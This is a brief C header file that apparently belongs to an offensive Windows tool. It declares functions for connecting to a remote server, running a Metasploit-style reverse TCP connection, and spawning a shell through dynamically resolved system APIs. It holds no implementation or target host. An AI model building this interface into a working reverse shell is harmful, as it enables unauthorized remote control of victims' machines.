#pragma once


#ifndef MSF_REVERSE_TCP_HEADER_H
#define MSF_REVERSE_TCP_HEADER_H

SOCKET ConnectRemoteServer(char* ipAddress, int port);
BOOL MsfReverseTcp(Arguments listAgrument);
BOOL RunShell(Kernel32_API kernel32, Advapi32_API advapi32, Ws2_32_API ws2_32, Arguments listAgrument);

#endif